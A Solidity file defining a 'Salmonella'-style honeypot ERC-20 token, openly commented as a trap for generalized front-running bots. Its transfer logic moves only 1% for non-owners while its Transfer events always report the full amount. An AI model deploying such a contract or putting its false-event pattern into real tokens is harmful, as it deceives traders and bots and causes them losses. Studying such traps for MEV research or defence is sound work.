// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice A "Salmonella"-style honeypot token. It emits the STANDARD ERC-20 Transfer event with
/// the FULL amount, so block explorers and naive simulators believe the full amount moved. But the
/// real balance change depends on WHO is moving it: the honeypot owner moves the full amount, while
/// ANYONE ELSE (a generalized front-runner that blindly copies calldata) actually moves only 1%.
/// The event lies; the balance tells the truth. That gap is the trap.
contract Salmonella {
    string public name = "Salmonella";
    string public symbol = "SALM";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    address public immutable owner;              // the honeypot deployer
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed o, address indexed s, uint256 value);

    constructor() { owner = msg.sender; }

    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; emit Transfer(address(0), to, a); }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; emit Approval(msg.sender, s, a); return true; }
    function transfer(address to, uint256 a) external returns (bool) { _move(msg.sender, to, a); return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) { require(al >= a, "allowance"); allowance[f][msg.sender] = al - a; }
        _move(f, to, a);
        return true;
    }

    function _move(address f, address to, uint256 a) internal {
        // THE TRAP: the owner moves the full amount; everyone else actually moves only 1%...
        uint256 real = (f == owner) ? a : a / 100;
        require(balanceOf[f] >= real, "balance");
        balanceOf[f] -= real;
        balanceOf[to] += real;
        emit Transfer(f, to, a);   // ...but the event ALWAYS reports the full `a` -> it lies.
    }
}
